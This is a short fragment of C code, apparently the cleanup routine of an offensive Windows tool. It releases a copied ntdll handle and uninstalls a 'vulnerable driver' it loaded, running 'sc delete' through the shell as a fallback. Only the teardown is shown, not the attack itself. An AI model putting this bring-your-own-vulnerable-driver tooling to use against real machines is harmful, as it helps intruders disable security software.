        FreeLibrary(ctx->Cache.NtdllCopyHandle);
        ctx->Cache.NtdllCopyHandle = NULL;
    }

    if (ctx->isDriverInstalled) {
        CloseDriverHandle();
        BOOL status = UninstallVulnerableDriver();
        if (status == FALSE) {
            _putts_or_not(TEXT("[!] An error occured while attempting to uninstall the vulnerable driver"));
            _tprintf_or_not(TEXT("[*] Executing: cmd /c sc delete %s\n"), GetDriverServiceName());
            TCHAR cmd[MAX_PATH] = { 0 };
            wsprintf(cmd, TEXT("cmd /c sc delete %s"), GetDriverServiceName());
            _wsystem(cmd);
            _putts_or_not(TEXT("[!] Please restart the machine for the uninstallation to be complete"));
        }
    }
}


